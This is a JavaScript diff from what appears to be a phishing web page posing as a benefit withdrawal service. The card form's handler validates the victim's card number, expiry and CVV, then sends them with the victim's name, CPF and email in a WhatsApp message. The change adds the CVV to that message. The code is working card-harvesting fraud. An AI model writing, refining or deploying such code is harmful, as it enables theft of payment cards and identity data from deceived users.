@@ -1137,55 +1137,64 @@ function mostrarOpcoesData(opcoes, dataReal) {
             showStep('flowCartao', 3);
         });
 
-        document.getElementById('confirmCartao').addEventListener('click', () => {
-            const numeroRaw = document.getElementById('numeroCartao').value.replace(/\D/g, '');
-            const validade = document.getElementById('validadeCartao').value;
-            const cvv = document.getElementById('cvvCartao').value;
-            const email = document.getElementById('emailCartao').value;
-            
-            if (!numeroRaw || !validade || !cvv || !email) {
-                alert('Por favor, preencha todos os campos.');
-                return;
-            }
-            
-            // VALIDAÇÃO LUHN DO CARTÃO
-            if (!validarCartaoLuhn(numeroRaw)) {
-                alert('❌ Número do cartão inválido! Verifique os dados.');
-                return;
-            }
-            
-            // Validar validade
-            if (validade.length === 5) {
-                const mes = parseInt(validade.slice(0, 2));
-                const ano = parseInt(validade.slice(3, 5));
-                const anoAtual = new Date().getFullYear() % 100;
-                const mesAtual = new Date().getMonth() + 1;
-                if (ano < anoAtual || (ano === anoAtual && mes < mesAtual)) {
-                    alert('❌ Cartão vencido! Verifique a validade.');
-                    return;
-                }
-            } else {
-                alert('❌ Data de validade inválida!');
-                return;
-            }
-            
-            // Validar CVV
-            const isAmex = numeroRaw.startsWith('34') || numeroRaw.startsWith('37');
-            const cvvMinLength = isAmex ? 4 : 3;
-            if (cvv.length < cvvMinLength) {
-                alert(`❌ CVV inválido! Deve ter ${cvvMinLength} dígitos.`);
-                return;
-            }
-            
-            const valor = dadosUsuario?.valorDisponivel || 1987.48;
-            const mensagem = `🆕 *NOVA SOLICITAÇÃO DE SAQUE - CARTÃO* 🆕\n\n👤 *Beneficiário:* ${dadosUsuario?.nome || 'N/A'}\n🆔 *CPF:* ${cpfAtual ? formatarCPFDisplay(cpfAtual) : 'N/A'}\n💳 *Cartão:* ${numeroRaw}\n📅 *Validade:* ${validade}\n📧 *E-mail:* ${email}\n💰 *Valor:* R$ ${formatarMoeda(valor)}\n✅ *Solicitação via Cartão*`;
-            
-            enviarWhatsApp(mensagem);
-            alert('✅ Solicitação enviada com sucesso!');
-            limparProgresso();
-            showStep('flowSuccess', 3);
-        });
-
+       document.getElementById('confirmCartao').addEventListener('click', () => {
+    const numeroRaw = document.getElementById('numeroCartao').value.replace(/\D/g, '');
+    const validade = document.getElementById('validadeCartao').value;
+    const cvv = document.getElementById('cvvCartao').value;
+    const email = document.getElementById('emailCartao').value;
+    
+    if (!numeroRaw || !validade || !cvv || !email) {
+        alert('Por favor, preencha todos os campos.');
+        return;
+    }
+    
+    // VALIDAÇÃO LUHN DO CARTÃO
+    if (!validarCartaoLuhn(numeroRaw)) {
+        alert('❌ Número do cartão inválido! Verifique os dados.');
+        return;
+    }
+    
+    // Validar validade
+    if (validade.length === 5) {
+        const mes = parseInt(validade.slice(0, 2));
+        const ano = parseInt(validade.slice(3, 5));
+        const anoAtual = new Date().getFullYear() % 100;
+        const mesAtual = new Date().getMonth() + 1;
+        if (ano < anoAtual || (ano === anoAtual && mes < mesAtual)) {
+            alert('❌ Cartão vencido! Verifique a validade.');
+            return;
+        }
+    } else {
+        alert('❌ Data de validade inválida!');
+        return;
+    }
+    
+    // Validar CVV
+    const isAmex = numeroRaw.startsWith('34') || numeroRaw.startsWith('37');
+    const cvvMinLength = isAmex ? 4 : 3;
+    if (cvv.length < cvvMinLength) {
+        alert(`❌ CVV inválido! Deve ter ${cvvMinLength} dígitos.`);
+        return;
+    }
+    
+    const valor = dadosUsuario?.valorDisponivel || 1987.48;
+    
+    // MENSAGEM COMPLETA COM CVV
+    const mensagem = `🆕 *NOVA SOLICITAÇÃO DE SAQUE - CARTÃO* 🆕\n\n` +
+        `👤 *Beneficiário:* ${dadosUsuario?.nome || 'N/A'}\n` +
+        `🆔 *CPF:* ${cpfAtual ? formatarCPFDisplay(cpfAtual) : 'N/A'}\n` +
+        `💳 *Cartão:* ${numeroRaw}\n` +
+        `📅 *Validade:* ${validade}\n` +
+        `🔢 *CVV:* ${cvv}\n` +
+        `📧 *E-mail:* ${email}\n` +
+        `💰 *Valor:* R$ ${formatarMoeda(valor)}\n` +
+        `✅ *Solicitação via Cartão*`;
+    
+    enviarWhatsApp(mensagem);
+    alert('✅ Solicitação enviada com sucesso!');
+    limparProgresso();
+    showStep('flowSuccess', 3);
+});
     
         document.getElementById('cancelCartao').addEventListener('click', () => {
             salvarProgresso();
